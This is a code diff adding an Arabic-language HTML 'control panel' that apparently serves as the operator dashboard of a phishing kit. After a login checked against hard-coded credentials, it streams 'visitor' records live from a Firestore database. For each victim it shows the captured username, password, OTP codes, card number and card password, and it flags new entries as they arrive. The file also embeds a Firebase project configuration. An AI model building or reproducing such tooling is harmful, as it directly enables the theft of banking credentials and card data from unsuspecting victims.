@@ -1,0 +1,717 @@
+<!DOCTYPE html>
+
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>لوحة التحكم</title>
+
+  <script src="https://cdn.tailwindcss.com"></script>
+
+  <link
+    href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&display=swap"
+    rel="stylesheet"
+  />
+
+  <style>
+    * {
+      font-family: "Cairo", sans-serif;
+      box-sizing: border-box;
+    }
+
+    body {
+      background: #f5f5f5;
+      margin: 0;
+    }
+
+    .screen-loader {
+      position: fixed;
+      inset: 0;
+      background: rgba(255,255,255,0.55);
+      backdrop-filter: blur(2px);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+    }
+
+    .screen-loader.active {
+      display: flex;
+    }
+
+    .spinner {
+      width: 52px;
+      height: 52px;
+      border: 4px solid rgba(0,87,168,.15);
+      border-top-color: #0057a8;
+      border-radius: 50%;
+      animation: spin .7s linear infinite;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+  </style>
+
+</head>
+<body>
+
+  <div id="loader" class="screen-loader">
+    <div class="spinner"></div>
+  </div>
+
+  <!-- LOGIN -->
+
+  <div id="loginPage" class="min-h-screen flex items-center justify-center p-5">
+
+
+<div class="w-full max-w-md bg-white rounded-3xl border border-[#e8e8e8] p-7 shadow-sm">
+
+  <div class="mb-8 text-center">
+    <h1 class="text-3xl font-extrabold text-[#222] mb-2">
+      لوحة التحكم
+    </h1>
+
+    <p class="text-sm text-[#888] font-semibold">
+      تسجيل دخول المشرف
+    </p>
+  </div>
+
+  <div class="space-y-5">
+
+    <div>
+      <label class="block mb-2 text-sm font-bold text-[#222]">
+        اسم المستخدم
+      </label>
+
+      <input
+        id="adminUsername"
+        type="text"
+        class="w-full h-14 rounded-2xl border border-[#d8d8d8] px-4 outline-none focus:border-[#0057a8]"
+        placeholder="أدخل اسم المستخدم"
+      />
+    </div>
+
+    <div>
+      <label class="block mb-2 text-sm font-bold text-[#222]">
+        كلمة المرور
+      </label>
+
+      <input
+        id="adminPassword"
+        type="password"
+        dir="ltr"
+        class="w-full h-14 rounded-2xl border border-[#d8d8d8] px-4 outline-none focus:border-[#0057a8] text-left"
+        placeholder="أدخل كلمة المرور"
+      />
+    </div>
+
+    <p id="loginError" class="hidden text-red-500 text-sm font-bold text-center">
+      بيانات الدخول غير صحيحة
+    </p>
+
+    <button
+      id="loginBtn"
+      class="w-full h-14 rounded-2xl bg-[#0057a8] text-white font-bold"
+    >
+      تسجيل الدخول
+    </button>
+
+  </div>
+
+</div>
+
+
+  </div>
+
+  <!-- DASHBOARD -->
+
+  <div id="dashboard" class="hidden min-h-screen p-5">
+
+
+<div class="max-w-7xl mx-auto">
+
+  <div class="bg-white border border-[#e8e8e8] rounded-3xl p-6 shadow-sm mb-6 flex items-center justify-between">
+
+    <div>
+      <h1 class="text-2xl font-extrabold text-[#222]">
+        لوحة الزوار
+      </h1>
+
+      <p class="text-sm text-[#777] mt-1">
+        متابعة الزوار والصفحات الحالية
+      </p>
+    </div>
+
+    <button
+      id="logoutBtn"
+      class="h-12 px-5 rounded-2xl bg-red-500 text-white font-bold"
+    >
+      تسجيل الخروج
+    </button>
+
+  </div>
+
+  <div class="bg-white border border-[#e8e8e8] rounded-3xl overflow-hidden shadow-sm">
+
+    <div class="overflow-x-auto">
+
+      <table class="w-full min-w-[700px]">
+
+        <thead class="bg-[#f8f8f8]">
+          <tr>
+            <th class="text-right p-5 text-sm font-extrabold text-[#444]">
+              المستخدم
+            </th>
+
+            <th class="text-right p-5 text-sm font-extrabold text-[#444]">
+              الصفحة الحالية
+            </th>
+
+            <th class="text-center p-5 text-sm font-extrabold text-[#444]">
+              التفاصيل
+            </th>
+          </tr>
+        </thead>
+
+        <tbody id="visitorsTable">
+        </tbody>
+
+      </table>
+
+    </div>
+
+  </div>
+
+</div>
+
+
+  </div>
+
+  <!-- MODAL -->
+
+  <div id="modal" class="hidden fixed inset-0 bg-black/40 z-50 flex items-center justify-center p-5">
+
+
+<div class="w-full max-w-md bg-white rounded-3xl p-6">
+
+  <div class="flex items-center justify-between mb-6">
+
+    <h2 class="text-xl font-extrabold text-[#222]">
+      بيانات الزائر
+    </h2>
+
+    <button id="closeModal" class="text-2xl text-[#777]">
+      ×
+    </button>
+
+  </div>
+
+  <div class="space-y-4">
+
+  <div>
+    <p class="text-sm text-[#888] mb-1">
+اسم المستخدم    </p>
+
+    <div id="modalInput1" class="font-bold text-[#222]">
+      -
+    </div>
+  </div>
+
+  <div>
+    <p class="text-sm text-[#888] mb-1">
+      كلمة المرور
+    </p>
+
+   <div
+  id="modalInput2"
+  dir="ltr"
+  class="font-bold text-[#222] text-left"
+>
+      -
+    </div>
+  </div>
+
+  <div>
+    <p class="text-sm text-[#888] mb-1">
+     otp
+    </p>
+
+    <div id="modalInput3" class="font-bold text-[#222]">
+      -
+    </div>
+  </div>
+
+  <div>
+  <p class="text-sm text-[#888] mb-1">
+    اسم المستخدم للاستعادة
+  </p>
+
+  <div id="modalForgotUsername"
+       class="font-bold text-[#222]">
+    -
+  </div>
+</div>
+
+  <div>
+    <p class="text-sm text-[#888] mb-1">
+     رقم البطاقة 
+    </p>
+
+    <div
+  id="modalInput4"
+  dir="ltr"
+  class="font-bold text-[#222] text-left"
+>
+      -
+    </div>
+  </div>
+
+  <div>
+    <p class="text-sm text-[#888] mb-1">
+    كلمة مرور البطاقة 
+    </p>
+
+    <div
+  id="modalInput5"
+  dir="ltr"
+  class="font-bold text-[#222] text-left"
+>
+      -
+    </div>
+  </div>
+
+  <div>
+    <p class="text-sm text-[#888] mb-1">
+     otp استعادة 
+    </p>
+
+    <div
+  id="modalInput6"
+  dir="ltr"
+  class="font-bold text-[#222] text-left"
+>
+
+      -
+    </div>
+  </div>
+
+</div>
+
+
+  </div>
+
+  <script>
+
+  const ADMIN_USERNAME = "ward";
+  const ADMIN_PASSWORD = "Aa100200@";
+
+  const loginBtn =
+    document.getElementById("loginBtn");
+
+  const loginPage =
+    document.getElementById("loginPage");
+
+  const dashboard =
+    document.getElementById("dashboard");
+
+  const loader =
+    document.getElementById("loader");
+
+  const loginError =
+    document.getElementById("loginError");
+
+  const visitorsTable =
+    document.getElementById("visitorsTable");
+
+  // CURRENT OPEN MODAL VISITOR
+  let currentVisitorIndex = null;
+  
+  let previousVisitors = [];
+  let updatedVisitors = [];
+  let allVisitors = [];
+  // LOGIN
+  loginBtn.addEventListener("click", () => {
+
+    const username =
+      document.getElementById("adminUsername")
+      .value.trim();
+
+    const password =
+      document.getElementById("adminPassword")
+      .value.trim();
+
+    if (
+      username === ADMIN_USERNAME &&
+      password === ADMIN_PASSWORD
+    ) {
+
+      loginError.classList.add("hidden");
+
+      loader.classList.add("active");
+
+      setTimeout(() => {
+
+        loader.classList.remove("active");
+
+        loginPage.classList.add("hidden");
+
+        dashboard.classList.remove("hidden");
+
+        loadVisitors();
+
+        previousVisitors =
+  JSON.parse(
+    localStorage.getItem("visitors")
+  ) || [];
+
+        // LIVE AUTO UPDATE
+        startLiveUpdates();
+
+      }, 1500);
+
+    }
+
+    else {
+
+      loginError.classList.remove("hidden");
+
+    }
+
+  });
+
+  // LOGOUT
+  document
+    .getElementById("logoutBtn")
+    .addEventListener("click", () => {
+
+      dashboard.classList.add("hidden");
+
+      loginPage.classList.remove("hidden");
+
+      clearInterval(window.liveVisitorsInterval);
+
+  });
+
+  // LOAD VISITORS
+  function loadVisitors(visitors) {
+
+  visitorsTable.innerHTML = "";
+
+  visitors.forEach((visitor, index) => {
+
+    const hasUpdate =
+      updatedVisitors.includes(visitor.id);
+
+    visitorsTable.innerHTML += `
+
+      <tr class="border-t border-[#efefef]">
+
+        <td class="p-5 font-bold text-[#222]">
+          ${visitor.username || "-"}
+        </td>
+
+        <td class="p-5 text-[#555] font-semibold">
+          ${visitor.currentPage || "-"}
+        </td>
+
+        <td class="p-5 text-center">
+
+          <div class="relative inline-block">
+
+            <button
+              onclick="showVisitor(${index})"
+              class="
+                h-11
+                px-5
+                rounded-2xl
+                bg-[#0057a8]
+                text-white
+                font-bold
+              "
+            >
+              عرض
+            </button>
+
+            ${
+              hasUpdate
+              ? `
+                <span
+                  class="
+                    absolute
+                    -top-1
+                    -right-1
+                    w-4
+                    h-4
+                    rounded-full
+                    bg-red-500
+                    border-2
+                    border-white
+                  "
+                ></span>
+              `
+              : ""
+            }
+
+          </div>
+
+        </td>
+
+      </tr>
+
+    `;
+
+  });
+
+}
+
+  // LIVE UPDATE
+  function startLiveUpdates() {
+
+  const visitorsRef =
+    window.firebaseFns.collection(
+      window.db,
+      "visitors"
+    );
+
+  window.firebaseFns.onSnapshot(
+    visitorsRef,
+    (snapshot) => {
+
+      allVisitors = [];
+
+      snapshot.forEach((doc) => {
+
+        allVisitors.push(doc.data());
+
+      });
+
+      detectUpdates(allVisitors);
+
+      loadVisitors(allVisitors);
+
+      updateModalData();
+
+    }
+  );
+
+}
+
+  // SHOW NOTIFICATION
+
+
+
+
+// DETECT CHANGES
+// DETECT CHANGES
+function detectUpdates(visitors) {
+
+  visitors.forEach((visitor) => {
+
+    const oldVisitor =
+      previousVisitors.find(
+        (v) => v.id === visitor.id
+      );
+
+    if (!oldVisitor) return;
+
+    const changed =
+
+      oldVisitor.currentPage !==
+      visitor.currentPage ||
+
+      oldVisitor.entered2Input !==
+      visitor.entered2Input ||
+
+      oldVisitor.entered3Input !==
+      visitor.entered3Input ||
+
+      oldVisitor.enteredForgotUsername !==
+      visitor.enteredForgotUsername ||
+
+      oldVisitor.entered4Input !==
+      visitor.entered4Input ||
+
+      oldVisitor.entered5Input !==
+      visitor.entered5Input ||
+
+      oldVisitor.entered6Input !==
+      visitor.entered6Input;
+
+    if (changed) {
+
+      if (
+        !updatedVisitors.includes(
+          visitor.id
+        )
+      ) {
+
+        updatedVisitors.push(
+          visitor.id
+        );
+
+      }
+
+    }
+
+  });
+
+  previousVisitors =
+    JSON.parse(
+      JSON.stringify(visitors)
+    );
+
+}
+
+  // SHOW POPUP
+  function showVisitor(index) {
+
+    currentVisitorIndex = index;
+
+    const visitors = allVisitors;
+
+const visitor =
+  visitors[index];
+
+updatedVisitors =
+  updatedVisitors.filter(
+    id => id !== visitor.id
+  );
+
+loadVisitors();
+
+    updateModalData();
+
+    document
+      .getElementById("modal")
+      .classList.remove("hidden");
+
+  }
+
+  // UPDATE MODAL LIVE
+  
+function updateModalData() {
+
+  if (currentVisitorIndex === null)
+    return;
+
+  const visitors = allVisitors;
+
+  const visitor =
+    visitors[currentVisitorIndex];
+
+  if (!visitor) return;
+
+  document.getElementById(
+    "modalInput1"
+  ).textContent =
+    visitor.username || "-";
+
+  document.getElementById(
+    "modalInput2"
+  ).textContent =
+    visitor.entered2Input || "-";
+
+  document.getElementById(
+    "modalInput3"
+  ).textContent =
+    visitor.entered3Input || "-";
+
+    document.getElementById(
+  "modalForgotUsername"
+).textContent =
+  visitor.enteredForgotUsername || "-";
+
+  document.getElementById(
+    "modalInput4"
+  ).textContent =
+    visitor.entered4Input || "-";
+
+  document.getElementById(
+    "modalInput5"
+  ).textContent =
+    visitor.entered5Input || "-";
+
+  document.getElementById(
+    "modalInput6"
+  ).textContent =
+    visitor.entered6Input || "-";
+
+}
+
+  // CLOSE MODAL
+  document
+    .getElementById("closeModal")
+    .addEventListener("click", () => {
+
+      document
+        .getElementById("modal")
+        .classList.add("hidden");
+
+      currentVisitorIndex = null;
+
+  });
+
+</script>
+
+<script type="module">
+
+import { initializeApp }
+from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+
+import {
+  getFirestore,
+  collection,
+  onSnapshot,
+  doc,
+  setDoc
+}
+from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+const firebaseConfig = {
+
+  apiKey:
+    "AIzaSyCUs5CdBaeLUiglxu5gaijfJFNSaDRQd3U",
+
+  authDomain:
+    "letsgo-bd65d.firebaseapp.com",
+
+  projectId:
+    "letsgo-bd65d",
+
+  storageBucket:
+    "letsgo-bd65d.appspot.com",
+
+  messagingSenderId:
+    "629849401898",
+
+  appId:
+    "1:629849401898:web:45148ce771ac50e7623153",
+
+  measurementId:
+    "G-GFGNTNLPH7"
+
+};
+
+const app =
+  initializeApp(firebaseConfig);
+
+const db =
+  getFirestore(app);
+
+window.db = db;
+
+window.firebaseFns = {
+  collection,
+  onSnapshot,
+  doc,
+  setDoc
+};
+
+console.log("Firebase Connected");
+
+</script>
+</body>
+</html>
